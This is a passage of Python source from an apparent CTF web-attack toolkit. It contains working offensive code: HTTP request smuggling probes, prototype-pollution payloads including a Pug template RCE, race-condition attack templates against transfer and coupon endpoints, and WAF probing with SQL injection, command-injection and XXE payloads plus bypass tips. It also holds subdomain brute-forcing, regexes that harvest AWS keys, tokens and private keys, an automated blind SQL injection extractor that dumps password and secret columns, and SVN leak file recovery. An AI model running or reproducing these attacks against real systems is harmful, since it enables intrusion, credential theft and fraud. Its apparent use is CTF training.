                results.append(f"  [-] {t('web.smuggling.no_clte')}")
        else:
            results.append(f"  [-] CL-TE {t('web.smuggling.send_failed')}")

        # 测试 TE-CL
        results.append(f"\n--- TE-CL {t('web.detection')} ---")
        te_cl_payload = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 3\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"8\r\n"
            f"SMUGGLED\r\n"
            f"0\r\n"
            f"\r\n"
        ).encode()

        status3, len3, time3 = send_raw_request(te_cl_payload)

        if status3 > 0:
            results.append(f"  {t('web.smuggling.probe_req')}: {t('web.status_code')}={status3}, {t('web.length')}={len3}, {t('web.elapsed')}={time3:.2f}s")
            if time3 > time1 + 5:
                results.append(f"  [!] {t('web.smuggling.tecl_possible')}")
            elif status3 in (400, 500, 502, 503):
                results.append(f"  [?] {t('web.smuggling.probe_abnormal')} {status3}, {t('web.smuggling.conflict')}")
            else:
                results.append(f"  [-] {t('web.smuggling.no_tecl')}")
        else:
            results.append(f"  [-] TE-CL {t('web.smuggling.send_failed')}")

        # 检查 Transfer-Encoding 头处理
        results.append(f"\n--- Transfer-Encoding {t('web.smuggling.variant_test')} ---")
        te_variants = [
            (t("web.smuggling.standard"), "Transfer-Encoding: chunked"),
            (t("web.smuggling.case_variant"), "Transfer-Encoding: Chunked"),
            (t("web.smuggling.multi_value"), "Transfer-Encoding: chunked, identity"),
            (t("web.smuggling.space_padding"), "Transfer-Encoding : chunked"),
            (t("web.smuggling.tab"), "Transfer-Encoding:\tchunked"),
        ]
        for name, te_header in te_variants:
            variant_req = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Length: 5\r\n"
                f"{te_header}\r\n"
                f"\r\n"
                f"0\r\n"
                f"\r\n"
            ).encode()
            s, l, elapsed = send_raw_request(variant_req)
            if s > 0:
                results.append(f"  {name}: {t('web.status_code')}={s}")
            else:
                results.append(f"  {name}: {t('web.request_failed')}")

        results.append(f"\n{t('web.description')}:")
        results.append(f"  - CL-TE: {t('web.smuggling.clte_desc')}")
        results.append(f"  - TE-CL: {t('web.smuggling.tecl_desc')}")
        results.append(f"  - {t('web.smuggling.timeout_hint')}")
        results.append(f"  - {t('web.smuggling.burp_hint')}")

        return '\n'.join(results)

    # ========== 原型链污染辅助 ==========

    def prototype_pollution_helper(self) -> str:
        """原型链污染辅助 -- 常见 payload 和检测方法"""
        return '''=== 原型链污染 (Prototype Pollution) 辅助 ===

1. 常见 Payload:
   a) __proto__ 污染:
      {"__proto__": {"isAdmin": true}}
      {"__proto__": {"role": "admin"}}
      {"__proto__": {"constructor": {"name": ""}}}

   b) constructor.prototype 污染:
      {"constructor": {"prototype": {"isAdmin": true}}}

   c) 嵌套属性污染:
      {"a": {"__proto__": {"b": "polluted"}}}
      {"a": 1, "__proto__": {"toString": "polluted"}}

   d) 数组场景:
      []["__proto__"]["polluted"] = true

2. 检测方法:
   a) 黑盒检测:
      - 发送 {"__proto__": {"testProp": "testVal"}}
      - 检查后续响应中是否出现 testProp
      - 尝试 JSON Merge Patch: PATCH 请求带 __proto__

   b) 白盒审计 (代码审查):
      - 搜索: merge, extend, clone, deepCopy 等递归合并函数
      - 检查是否过滤了 __proto__, constructor, prototype 键
      - 检查 Object.assign 的使用（浅拷贝不受影响，但自定义深拷贝可能有问题）

3. 常见存在漏洞的库和版本:
   - lodash < 4.17.12 (CVE-2019-10744): _.defaultsDeep, _.merge
   - jQuery < 3.4.0 (CVE-2019-11358): $.extend(true, ...)
   - Hoek < 5.0.3 (CVE-2018-3728): Hoek.merge / Hoek.applyToDefaults
   - minimist < 1.2.6 (CVE-2021-44906)
   - node-forge < 1.0.0
   - express-fileupload < 1.1.10
   - qs < 6.3.2 (CVE-2017-1000048)

4. 利用场景:
   - 权限提升: 污染 isAdmin, role 等属性
   - 模板注入 (RCE): Handlebars/Pug/EJS 通过原型链触发 SSTI
     Pug: {"__proto__": {"block": {"type": "Text", "val": "require('child_process').execSync('id')"}}}
   - 拒绝服务: 污染 toString/valueOf 导致崩溃
   - XSS: 污染模板渲染属性

5. 修复建议:
   - 使用 Object.create(null) 创建无原型对象
   - 在递归合并时过滤 __proto__, constructor, prototype 键
   - 使用 Map 代替普通对象存储用户数据
   - 升级存在漏洞的依赖库
   - 使用 Object.freeze(Object.prototype) 防止原型被修改（可能有副作用）
   - 启用 --disable-proto=throw (Node.js 12+)
'''

    # ========== 竞争条件辅助 ==========

    def race_condition_helper(self) -> str:
        """竞争条件辅助 -- 并发请求模板和常见场景"""
        return '''=== 竞争条件 (Race Condition) 辅助 ===

1. Python 多线程并发请求模板:
   ```python
   import threading
   import requests

   url = "http://target.com/api/transfer"
   data = {"amount": 1000, "to": "attacker"}
   headers = {"Cookie": "session=xxx"}

   def send_request():
       try:
           resp = requests.post(url, json=data, headers=headers)
           print(f"Status: {resp.status_code}, Body: {resp.text[:100]}")
       except Exception as e:
           print(f"Error: {e}")

   threads = []
   for i in range(50):
       t = threading.Thread(target=send_request)
       threads.append(t)

   # 尽量同时启动所有线程
   for t in threads:
       t.start()
   for t in threads:
       t.join()
   ```

2. asyncio 异步并发模板:
   ```python
   import asyncio
   import aiohttp

   async def send_request(session, url, data):
       async with session.post(url, json=data) as resp:
           text = await resp.text()
           print(f"Status: {resp.status}, Body: {text[:100]}")

   async def main():
       url = "http://target.com/api/redeem"
       data = {"code": "COUPON123"}
       async with aiohttp.ClientSession() as session:
           tasks = [send_request(session, url, data) for _ in range(100)]
           await asyncio.gather(*tasks)

   asyncio.run(main())
   ```

3. Burp Suite Turbo Intruder 使用方法:
   a) 安装: BApp Store 搜索 "Turbo Intruder"
   b) 使用步骤:
      - 右键请求 -> Extensions -> Turbo Intruder -> Send to Turbo Intruder
      - 选择 race.py 模板
      - 修改脚本中的并发数和请求内容
      - 点击 Attack
   c) 常用脚本:
      ```python
      def queueRequests(target, wordlists):
          engine = RequestEngine(endpoint=target.endpoint,
                                 concurrentConnections=30,
                                 requestsPerConnection=100,
                                 pipeline=False)
          for i in range(30):
              engine.queue(target.req, target.baseInput)

      def handleResponse(req, interesting):
          table.add(req)
      ```

4. 常见竞争条件场景:
   a) 余额/转账:
      - 同时发送多个转账请求
      - 检查是否可以透支或重复扣款
      - 关键: 数据库事务隔离级别不当

   b) 优惠券/兑换码:
      - 同时使用同一个优惠券
      - 检查是否可以多次兑换
      - 关键: 先查询后更新的 TOCTOU 问题

   c) 投票/点赞:
      - 并发提交投票请求
      - 检查计数是否正确
      - 关键: 非原子性的 read-modify-write 操作

   d) 文件上传:
      - 上传文件后立即访问（在安全检查删除之前）
      - 关键: 上传与删除之间的时间窗口
      - 技巧: 不断上传+不断访问，利用时间窗口

   e) 注册/创建:
      - 同时注册同一用户名
      - 检查唯一性约束是否在应用层实现
      - 关键: 应用层检查 vs 数据库约束

5. 检测技巧:
   - 使用 HTTP/1.1 管线化 (Pipeline) 发送请求减少网络延迟差异
   - HTTP/2 单连接多路复用更容易触发竞争
   - 关注响应中的细微差异（余额变化、错误消息不同）
   - 多次重复测试以提高成功率
'''

    # ========== WAF 检测 ==========

    def detect_waf(self, url: str) -> str:
        """WAF (Web Application Firewall) 检测"""
        if not self.session:
            return f"[!] {t('web.need_requests')}"

        results = [f"=== {t('web.waf_title')} ===", f"{t('web.target')}: {url}"]

        # 首先获取正常响应作为基线
        try:
            baseline = self._get(url)
            baseline_status = baseline.status_code
            baseline_len = len(baseline.content)
            results.append(f"{t('web.waf.baseline')}: {t('web.status_code')}={baseline_status}, {t('web.length')}={baseline_len}")
        except Exception as e:
            results.append(f"[!] {t('web.waf.cannot_baseline')}: {e}")
            return '\n'.join(results)

        # 检查响应头中的 WAF 指纹
        results.append(f"\n--- {t('web.waf.header_fingerprint')} ---")
        headers_lower = {k.lower(): v for k, v in baseline.headers.items()}

        waf_header_signatures = {
            'server': {
                'cloudflare': 'Cloudflare',
                'akamaighost': 'Akamai',
                'awselb': 'AWS ELB',
                'bigip': 'F5 BIG-IP',
                'yunjiasu': t('web.waf.baidu_cdn'),
                'safe3': 'Safe3 WAF',
                'wangzhan': t('web.waf.wangzhan'),
                'huawei': t('web.waf.huawei'),
            },
            'x-cdn': {
                'incapsula': 'Incapsula/Imperva',
            },
            'x-sucuri': {
                '': 'Sucuri WAF',
            },
            'x-powered-by-360wzb': {
                '': '360' + t('web.waf.wangzhan'),
            },
        }

        waf_detected = []

        # 检查特定 WAF 指纹头
        for header, signatures in waf_header_signatures.items():
            val = headers_lower.get(header, '').lower()
            for sig, waf_name in signatures.items():
                if sig and sig in val:
                    waf_detected.append(waf_name)
                    results.append(f"  [!] {header}: {headers_lower.get(header)} -> {waf_name}")
                elif not sig and header in headers_lower:
                    waf_detected.append(waf_name)
                    results.append(f"  [!] {t('web.waf.detected_header')} {header} -> {waf_name}")

        # 检查 Cloudflare 特征
        if 'cf-ray' in headers_lower:
            waf_detected.append('Cloudflare')
            results.append("  [!] CF-Ray 头存在 -> Cloudflare")
        if 'cf-cache-status' in headers_lower:
            results.append(f"  [*] CF-Cache-Status: {headers_lower['cf-cache-status']}")

        # 检查 AWS WAF 特征
        if 'x-amzn-requestid' in headers_lower:
            results.append(f"  [*] AWS {t('web.waf.request_id')} -> {t('web.waf.possible_aws')}")
        if 'x-amz-cf-id' in headers_lower:
            waf_detected.append('AWS CloudFront')
            results.append("  [!] X-Amz-Cf-Id 存在 -> AWS CloudFront")

        # 检查 ModSecurity 特征
        if 'modsecurity' in headers_lower.get('server', '').lower():
            waf_detected.append('ModSecurity')
            results.append(f"  [!] ModSecurity {t('web.detected')}")

        # 检查 Set-Cookie 中的 WAF 标记
        cookies = headers_lower.get('set-cookie', '').lower()
        if '__cfduid' in cookies or 'cf_clearance' in cookies:
            if 'Cloudflare' not in waf_detected:
                waf_detected.append('Cloudflare')
            results.append(f"  [!] Cloudflare Cookie {t('web.waf.signature')}")
        if 'incap_ses' in cookies or 'visid_incap' in cookies:
            waf_detected.append('Incapsula/Imperva')
            results.append(f"  [!] Incapsula Cookie {t('web.waf.signature')}")

        if not waf_detected:
            results.append(f"  [-] {t('web.waf.no_fingerprint')}")

        # 发送触发 payload 检测 WAF 行为
        results.append(f"\n--- {t('web.waf.trigger_test')} ---")

        trigger_payloads = [
            ("XSS payload", {"test": "<script>alert(1)</script>"}),
            (t("web.waf.sql_injection"), {"test": "' OR 1=1 --"}),
            (t("web.waf.cmd_injection"), {"test": "; cat /etc/passwd"}),
            (t("web.waf.path_traversal"), {"test": "../../etc/passwd"}),
            ("XXE payload", {"test": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>"}),
        ]

        waf_status_codes = {403, 406, 429, 501, 503}

        for name, params in trigger_payloads:
            try:
                parsed = urlparse(url)
                existing_params = parse_qs(parsed.query, keep_blank_values=True)
                existing_params.update(params)
                test_query = urlencode(existing_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=test_query))

                resp = self._get(test_url)
                status = resp.status_code
                resp_len = len(resp.content)

                if status in waf_status_codes:
                    results.append(f"  [!] {name}: {t('web.status_code')} {status} ({t('web.waf.block_sig')})")
                elif status != baseline_status:
                    results.append(f"  [?] {name}: {t('web.status_code')} {status} ({t('web.waf.diff_baseline')} {baseline_status})")
                elif abs(resp_len - baseline_len) > baseline_len * 0.5 and baseline_len > 0:
                    results.append(f"  [?] {name}: {t('web.waf.abnormal_length')} ({resp_len} vs {t('web.waf.baseline_short')} {baseline_len})")
                else:
                    results.append(f"  [-] {name}: {t('web.status_code')} {status}, {t('web.waf.no_block')}")

                # 检查响应体中的 WAF 关键词
                body_lower = resp.text.lower()
                waf_body_keywords = ['access denied', 'forbidden', 'blocked', 'waf',
                                     'firewall', 'security', 'not acceptable',
                                     '拦截', '禁止访问', '安全防护']
                for kw in waf_body_keywords:
                    if kw in body_lower:
                        results.append(f"      -> {t('web.waf.body_keyword')}: '{kw}'")
                        break

            except Exception:
                results.append(f"  [-] {name}: {t('web.request_failed')}")

        # 汇总
        results.append(f"\n--- {t('web.summary')} ---")
        if waf_detected:
            results.append(f"{t('web.waf.detected_waf')}: {', '.join(set(waf_detected))}")
            results.append(f"\n{t('web.waf.bypass_tips')}:")
            results.append(f"  - {t('web.waf.tip_encoding')}")
            results.append(f"  - {t('web.waf.tip_case')}")
            results.append(f"  - {t('web.waf.tip_equivalent')}")
            results.append(f"  - {t('web.waf.tip_chunked')}")
            results.append(f"  - {t('web.waf.tip_hpp')}")
            results.append(f"  - {t('web.waf.tip_method')}")
            if 'Cloudflare' in waf_detected:
                results.append(f"  - Cloudflare: {t('web.waf.tip_cloudflare')}")
        else:
            results.append(t("web.waf.no_waf_detected"))

        return '\n'.join(results)

    # ========== 信息收集 ==========

    def subdomain_enum(self, domain: str) -> str:
        """子域名枚举（字典爆破）"""
        self._check_requests()
        import socket
        prefixes = [
            'www', 'mail', 'ftp', 'admin', 'test', 'dev', 'staging', 'api',
            'blog', 'shop', 'cdn', 'img', 'static', 'app', 'beta', 'demo',
            'docs', 'git', 'jenkins', 'jira', 'vpn', 'remote', 'portal',
            'oa', 'crm', 'erp', 'hr', 'intranet', 'internal', 'backup',
            'm', 'mobile', 'wap', 'wx', 'pay', 'sso', 'auth', 'login',
            'ns1', 'ns2', 'mx', 'smtp', 'pop', 'imap', 'db', 'mysql',
            'redis', 'mongo', 'es', 'kafka', 'mq', 'zk',
        ]
        domain = domain.strip().replace('http://', '').replace('https://', '').split('/')[0]
        found = []
        lines = [f"=== 子域名枚举: {domain} ===", f"字典大小: {len(prefixes)}", ""]
        for prefix in prefixes:
            subdomain = f"{prefix}.{domain}"
            try:
                ip = socket.gethostbyname(subdomain)
                found.append((subdomain, ip))
                lines.append(f"  [+] {subdomain} -> {ip}")
            except socket.gaierror:
                pass
        if found:
            lines.insert(3, f"发现 {len(found)} 个子域名:\n")
        else:
            lines.append("未发现活跃子域名")
        return "\n".join(lines)

    def fingerprint(self, url: str) -> str:
        """Web 指纹识别（框架/CMS 检测）"""
        self._check_requests()
        lines = ["=== Web 指纹识别 ===", f"目标: {url}", ""]
        try:
            resp = self._get(url)
            headers = {k.lower(): v for k, v in resp.headers.items()}
            body = resp.text[:10000].lower()
            detected = []
            # Server 头
            if 'server' in headers:
                detected.append(f"Server: {headers['server']}")
            if 'x-powered-by' in headers:
                detected.append(f"X-Powered-By: {headers['x-powered-by']}")
            # CMS 指纹
            cms_signs = {
                'WordPress': ['wp-content', 'wp-includes', 'wp-json'],
                'Drupal': ['drupal.js', 'sites/default', 'drupal.settings'],
                'Joomla': ['joomla', '/administrator/', 'com_content'],
                'Django': ['csrfmiddlewaretoken', 'django'],
                'Laravel': ['laravel_session', 'laravel'],
                'Spring': ['spring', 'whitelabel error page'],
                'Flask': ['werkzeug', 'flask'],
                'Express': ['express', 'x-powered-by: express'],
                'ThinkPHP': ['thinkphp', 'think_template'],
                'Vue.js': ['vue.js', 'vue.min.js', 'v-cloak'],
                'React': ['react', 'reactdom', '_next/static'],
                'Angular': ['ng-version', 'angular.js', 'ng-app'],
                'jQuery': ['jquery', 'jquery.min.js'],
                'Bootstrap': ['bootstrap.min.css', 'bootstrap.min.js'],
            }
            for name, keywords in cms_signs.items():
                for kw in keywords:
                    if kw in body or kw in str(headers):
                        detected.append(f"框架/CMS: {name} (匹配: {kw})")
                        break
            if detected:
                for d in detected:
                    lines.append(f"  [+] {d}")
            else:
                lines.append("  [-] 未识别到已知框架/CMS")
        except Exception as e:
            lines.append(f"  [-] 检测失败: {e}")
        return "\n".join(lines)

    def info_gather(self, url: str) -> str:
        """敏感信息收集（从页面提取邮箱/IP/链接等）"""
        self._check_requests()
        lines = ["=== 敏感信息收集 ===", f"目标: {url}", ""]
        try:
            resp = self._get(url)
            body = resp.text
            # 邮箱
            emails = set(re.findall(r'[\w.+-]+@[\w-]+\.[\w.]+', body))
            if emails:
                lines.append(f"  [邮箱] 发现 {len(emails)} 个:")
                for e in sorted(emails)[:20]:
                    lines.append(f"    {e}")
            # IP 地址
            ips = set(re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', body))
            internal_ips = [ip for ip in ips if ip.startswith(('10.', '172.', '192.168.', '127.'))]
            if internal_ips:
                lines.append(f"  [内网IP] 发现 {len(internal_ips)} 个:")
                for ip in sorted(internal_ips)[:10]:
                    lines.append(f"    {ip}")
            # API Key 模式
            api_patterns = {
                'AWS Key': r'AKIA[0-9A-Z]{16}',
                'GitHub Token': r'ghp_[A-Za-z0-9_]{36}',
                'Google API': r'AIza[0-9A-Za-z\-_]{35}',
                'JWT Token': r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+',
                'Private Key': r'-----BEGIN (?:RSA |DSA |EC )?PRIVATE KEY-----',
            }
            for name, pattern in api_patterns.items():
                matches = re.findall(pattern, body)
                if matches:
                    lines.append(f"  [{name}] 发现 {len(matches)} 个:")
                    for m in matches[:5]:
                        lines.append(f"    {m[:80]}...")
            # 链接提取
            links = set(re.findall(r'href=["\']([^"\']+)["\']', body))
            external = [l for l in links if l.startswith('http') and url.split('/')[2] not in l]
            if external:
                lines.append(f"  [外部链接] 发现 {len(external)} 个:")
                for l in sorted(external)[:10]:
                    lines.append(f"    {l}")
            # HTML 注释
            comments = re.findall(r'<!--(.*?)-->', body, re.DOTALL)
            if comments:
                lines.append(f"  [HTML注释] 发现 {len(comments)} 个:")
                for c in comments[:5]:
                    lines.append(f"    {c.strip()[:100]}")
            if len(lines) == 3:
                lines.append("  [-] 未发现敏感信息")
        except Exception as e:
            lines.append(f"  [-] 收集失败: {e}")
        return "\n".join(lines)

    # ========== SQL 时间盲注 ==========

    def sqli_time_blind(self, url: str, param: str = "", progress_callback=None) -> str:
        """SQL 时间盲注自动化提取 — 通过 SLEEP 延迟逐字符提取数据

        Args:
            progress_callback: 可选回调函数，接收当前进度文本，用于 GUI 实时显示
        """
        import time as _time
        self._check_requests()
        from ctftool.core.flag_finder import flag_finder

        results = [f"=== {t('web.sqli_auto.time_blind_title')} ===", f"{t('web.target')}: {url}", ""]

        def _emit_progress():
            if progress_callback:
                progress_callback("\n".join(results))

        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not param:
            if params:
                param = list(params.keys())[0]
                results.append(f"[*] {t('web.sqli_auto.auto_param')}: {param}")
            else:
                results.append(f"[-] {t('web.sqli_auto.no_param')}")
                return "\n".join(results)

        original_value = params.get(param, ["1"])[0]
        sleep_time = 1.5
        threshold = 1.0

        def _send_timed(payload_value):
            try:
                test_params = params.copy()
                test_params[param] = [payload_value]
                test_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=test_query))
                start = _time.time()
                self._get(test_url)
                return _time.time() - start
            except Exception:
                return 0

        # Step 1: 确认时间盲注
        results.append(f"[Step 1] {t('web.sqli_auto.step1_title')}")

        inject_type = ""
        inject_templates = [
            ("numeric", f"{original_value} AND SLEEP({sleep_time})", f"{original_value} AND SLEEP(0)"),
            ("string_single", f"{original_value}' AND SLEEP({sleep_time})-- -", f"{original_value}' AND SLEEP(0)-- -"),
            ("string_single_plus", f"{original_value}' AND SLEEP({sleep_time})--+", f"{original_value}' AND SLEEP(0)--+"),
            ("string_single_hash", f"{original_value}' AND SLEEP({sleep_time})#", f"{original_value}' AND SLEEP(0)#"),
        ]

        for itype, true_pl, false_pl in inject_templates:
            t_true = _send_timed(true_pl)
            t_false = _send_timed(false_pl)
            if t_true > threshold and t_false < threshold:
                inject_type = itype
                results.append(f"  [!] {itype}: SLEEP={t_true:.1f}s, NO_SLEEP={t_false:.1f}s")
                break

        if not inject_type:
            results.append(f"[-] {t('web.sqli_auto.time_blind_failed')}")
            return "\n".join(results)

        results.append(f"[+] {t('web.sqli_auto.time_blind_confirmed')} (type: {inject_type})")
        _emit_progress()

        # 构造 payload 模板
        if "numeric" in inject_type:
            def _make_payload(condition):
                return f"{original_value} AND IF({condition},SLEEP({sleep_time}),0)"
        elif "plus" in inject_type:
            def _make_payload(condition):
                return f"{original_value}' AND IF({condition},SLEEP({sleep_time}),0)--+"
        elif "hash" in inject_type:
            def _make_payload(condition):
                return f"{original_value}' AND IF({condition},SLEEP({sleep_time}),0)#"
        else:
            def _make_payload(condition):
                return f"{original_value}' AND IF({condition},SLEEP({sleep_time}),0)-- -"

        def _blind_char(query, pos):
            low, high = 32, 126
            while low <= high:
                mid = (low + high) // 2
                condition = f"ASCII(SUBSTR(({query}),{pos},1))>{mid}"
                elapsed = _send_timed(_make_payload(condition))
                if elapsed > threshold:
                    low = mid + 1
                else:
                    high = mid - 1
            return chr(low) if 32 < low <= 126 else None

        def _blind_extract(query, label, max_len=50):
            text = ""
            results.append(f"  [*] {label}...")
            _emit_progress()
            for i in range(1, max_len + 1):
                c = _blind_char(query, i)
                if c is None:
                    break
                text += c
                # 每个字符提取后更新进度
                results.append(f"    [{i}] '{c}' -> \"{text}\"")
                _emit_progress()
            # 清理中间过程行，只保留最终结果
            while results and results[-1].strip().startswith("["):
                if "-> \"" in results[-1]:
                    results.pop()
                else:
                    break
            text = text.strip()
            results.append(f"  [+] {label} = {text}")
            _emit_progress()
            return text

        # Step 2: 提取 database
        results.append(f"\n[Step 2] {t('web.sqli_auto.step4_title')}")
        db_name = _blind_extract("database()", "database()", 20)

        # Step 3: 提取表名
        results.append(f"\n[Step 3] {t('web.sqli_auto.step5_title')}")
        tables_str = _blind_extract(
            "SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()",
            "tables", 60)
        tables = [t_name.strip() for t_name in tables_str.split(",") if t_name.strip()]
        results.append(f"  Tables: {tables}")

        # Step 4: 对含 flag/secret 的表提取数据
        found_flags = []
        sensitive = [tb for tb in tables if any(kw in tb.lower() for kw in ('flag', 'secret', 'key', 'admin'))]
        if sensitive:
            results.append(f"\n[Step 4] {t('web.sqli_auto.step6_title')}")
            for tbl in sensitive:
                tbl_hex = f"0x{tbl.encode().hex()}"
                cols_str = _blind_extract(
                    f"SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name={tbl_hex}",
                    f"{tbl} columns", 60)
                cols = [c.strip() for c in cols_str.split(",") if c.strip()]
                results.append(f"  {tbl} -> columns: {cols}")

                for col in cols:
                    if any(kw in col.lower() for kw in ('flag', 'secret', 'key', 'pass', 'token')):
                        data = _blind_extract(f"SELECT {col} FROM {tbl} LIMIT 1", f"{tbl}.{col}", 60)
                        flags = flag_finder.search(data)
                        if flags:
                            found_flags.extend(flags)
                            results.append(f"  [!] FLAG: {', '.join(flags)}")
        elif tables:
            # 没有明显敏感表名，尝试每张表的第一列
            results.append(f"\n[Step 4] {t('web.sqli_auto.step6_title')}")
            for tbl in tables[:3]:
                tbl_hex = f"0x{tbl.encode().hex()}"
                cols_str = _blind_extract(
                    f"SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name={tbl_hex}",
                    f"{tbl} columns", 60)
                cols = [c.strip() for c in cols_str.split(",") if c.strip()]
                if cols:
                    data = _blind_extract(f"SELECT {cols[0]} FROM {tbl} LIMIT 1", f"{tbl}.{cols[0]}", 60)
                    flags = flag_finder.search(data)
                    if flags:
                        found_flags.extend(flags)
                        results.append(f"  [!] FLAG: {', '.join(flags)}")

        # 汇总
        results.append(f"\n=== {t('web.summary')} ===")
        results.append(f"  database: {db_name}")
        results.append(f"  tables: {tables}")
        if found_flags:
            results.append(f"\n[!] {t('web.flags_found')} ({len(found_flags)}):")
            for f in found_flags:
                results.append(f"    {f}")
        else:
            results.append(f"  [-] {t('web.sqli_auto.no_flag_extracted')}")
            results.append(f"  [*] sqlmap -u \"{url}\" --batch --technique=T")

        return "\n".join(results)

    # ========== SVN 泄露检测 ==========

    def detect_svn_leak(self, url: str) -> str:
        """检测 SVN 版本控制信息泄露并自动恢复文件内容"""
        from ctftool.core.flag_finder import flag_finder
        results = [f"=== SVN {t('web.leak_detection')} ==="]
        svn_found = False
        file_list = []
        found_flags = []

        try:
            # 检查 /.svn/entries (SVN < 1.7)
            entries_url = urljoin(url, '/.svn/entries')
            try:
                resp = self._get(entries_url)
                if resp.status_code == 200 and len(resp.text.strip()) > 0:
                    svn_found = True
                    results.append(f"[!] {t('web.found')} /.svn/entries ({len(resp.text)} bytes)")
                    lines_raw = resp.text.strip().split('\n')
                    if len(lines_raw) > 0:
                        results.append(f"  SVN {t('web.svn.format_version')}: {lines_raw[0].strip()}")
                    for i, line in enumerate(lines_raw):
                        line_s = line.strip()
                        if (i > 0 and line_s and not line_s.isdigit()
                                and not line_s.startswith('svn:')
                                and not line_s.startswith('http')
                                and len(line_s) < 200
                                and '/' not in line_s
                                and ' ' not in line_s
                                and line_s not in ('dir', 'file', 'has-props',
                                                   'has-prop-mods', 'normal')):
                            file_list.append(line_s)
                    if file_list:
                        results.append(f"  {t('web.svn.possible_files')} ({len(file_list)}):")
                        for fname in file_list[:30]:
                            results.append(f"    {fname}")
                else:
                    results.append(f"[-] /.svn/entries {t('web.not_found')}")
            except Exception as e:
                results.append(f"[-] /.svn/entries {t('web.request_failed')}: {e}")

            # 检查 /.svn/wc.db (SVN 1.7+)
            wcdb_url = urljoin(url, '/.svn/wc.db')
            try:
                resp = self._get(wcdb_url)
                if resp.status_code == 200 and len(resp.content) > 0:
                    is_sqlite = resp.content[:16].startswith(b'SQLite format 3')
                    if is_sqlite:
                        svn_found = True
                        results.append(f"[!] {t('web.found')} /.svn/wc.db (SQLite, {len(resp.content)} bytes)")
                        # 自动解析 wc.db 提取文件列表
                        import os
                        import tempfile
                        try:
                            import sqlite3
                            tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
                            tmp.write(resp.content)
                            tmp.close()
                            try:
                                conn = sqlite3.connect(tmp.name)
                                cursor = conn.execute(
                                    "SELECT local_relpath, checksum, translated_size, kind "
                                    "FROM NODES WHERE local_relpath != ''"
                                )
                                rows = cursor.fetchall()
                                conn.close()
                            finally:
                                os.unlink(tmp.name)
                            if rows:
                                results.append(f"\n=== SVN {t('web.svn.file_list')} ({len(rows)}) ===")
                                for path, checksum, size, kind in rows:
                                    kind_str = "dir" if kind == "dir" else "file"
                                    results.append(f"  [{kind_str}] {path} (checksum: {checksum or '-'}, size: {size or '-'})")
                                    if kind != "dir":
                                        file_list.append(path)
                        except Exception as e:
                            results.append(f"  [*] wc.db {t('web.svn.parse_failed')}: {e}")
                            results.append(f"  [*] {t('web.svn.wcdb_tool')}")
                    else:
                        results.append(f"[!] {t('web.found')} /.svn/wc.db ({len(resp.content)} bytes)")
                else:
                    results.append(f"[-] /.svn/wc.db {t('web.not_found')}")
            except Exception as e:
                results.append(f"[-] /.svn/wc.db {t('web.request_failed')}: {e}")

            # 阶段2: 自动恢复文件内容 — 通过 pristine 或直接 URL 访问
            if svn_found and file_list:
                results.append(f"\n=== {t('web.svn.auto_restore')} ({len(file_list)} files) ===")
                for fpath in file_list[:50]:
                    # 方式1: 尝试 .svn/pristine 目录（需要 checksum）
                    # 方式2: 尝试 .svn/text-base/{file}.svn-base (SVN < 1.7)
                    # 方式3: 直接访问文件 URL
                    content = None
                    source = ""
                    # SVN < 1.7 text-base
                    try:
                        tb_url = urljoin(url, f'/.svn/text-base/{fpath}.svn-base')
                        r = self._get(tb_url)
                        if r.status_code == 200 and len(r.content) > 0:
                            content = r.text
                            source = "text-base"
                    except Exception:
                        pass
                    # 直接访问
                    if not content:
                        try:
                            file_url = urljoin(url, '/' + fpath)
                            r = self._get(file_url)
                            if r.status_code == 200:
                                content = r.text
                                source = "direct"
                        except Exception:
                            pass
                    if content:
                        results.append(f"  [+] {fpath} ({source}, {len(content)} bytes)")
                        flags = flag_finder.search(content)
                        if flags:
                            for f in flags:
                                if f not in found_flags:
                                    found_flags.append(f)
                            results.append(f"      [!] FLAG: {', '.join(flags)}")
                        # 显示可能含 flag 的文件内容
                        if flags or any(kw in fpath.lower() for kw in ('flag', 'secret', 'key', 'pass', 'config', '.php', '.txt')):
                            results.append(f"      {content[:500]}")
                    else:
                        results.append(f"  [-] {fpath} ({t('web.svn.cannot_restore')})")

            if found_flags:
                results.append(f"\n[!] {t('web.flags_found')} ({len(found_flags)}):")
                for f in found_flags:
                    results.append(f"    {f}")
            elif not svn_found:
                results.append(f"\n[-] {t('web.svn.not_detected')}")

        except Exception as e:
            results.append(f"[-] SVN {t('web.detection_failed')}: {e}")

        return '\n'.join(results)

    # ========== .DS_Store 泄露检测 ==========

    def detect_ds_store(self, url: str) -> str:
        """检测 .DS_Store 文件泄露"""
        results = [f"=== .DS_Store {t('web.leak_detection')} ==="]

        try:
            ds_url = urljoin(url, '/.DS_Store')
            resp = self._get(ds_url)

            if resp.status_code != 200 or len(resp.content) == 0:
                results.append(f"[-] /.DS_Store {t('web.not_found')} ({t('web.status_code')}: {resp.status_code})")
                return '\n'.join(results)

            content = resp.content
            # DS_Store 文件以魔术字节 \x00\x00\x00\x01 Bud1 开头
            if len(content) < 8:
                results.append(f"[-] /.DS_Store {t('web.ds_store.too_small')}")
                return '\n'.join(results)

            magic = content[:8]
            is_ds_store = (magic[4:8] == b'Bud1') or (b'Bud1' in content[:36])
            if not is_ds_store:
                results.append(f"[?] /.DS_Store {t('web.ds_store.no_magic')} ({len(content)} bytes)")
                return '\n'.join(results)

            results.append(f"[!] {t('web.found')} /.DS_Store ({len(content)} bytes)")

            # 尝试从二进制数据中提取文件名
            # DS_Store 中的文件名以 UTF-16BE 编码存储
            # 简易方式：扫描可打印的 UTF-16BE 字符串
            file_names = set()
            i = 0
            while i < len(content) - 4:
                # 查找以长度前缀编码的 UTF-16 字符串
                # 格式: 4字节长度（文件名字符数） + UTF-16BE 编码的文件名
                if i + 4 < len(content):
